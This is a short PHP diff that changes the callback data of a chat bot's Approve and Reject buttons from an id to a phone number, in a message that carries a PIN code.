@@ -19,8 +19,8 @@ $message .= "Code: ".$pin;
 $keyboard = [
     'inline_keyboard' => [
         [
-            ['text' => 'Approve ✅', 'callback_data' => "approve_$id"],
-            ['text' => 'Reject ❌', 'callback_data' => "reject_$id"]
+            ['text' => 'Approve ✅', 'callback_data' => "approve_pin_$phone"],
+            ['text' => 'Reject ❌', 'callback_data' => "reject_pin_$phone"]
         ]
     ]
 ];
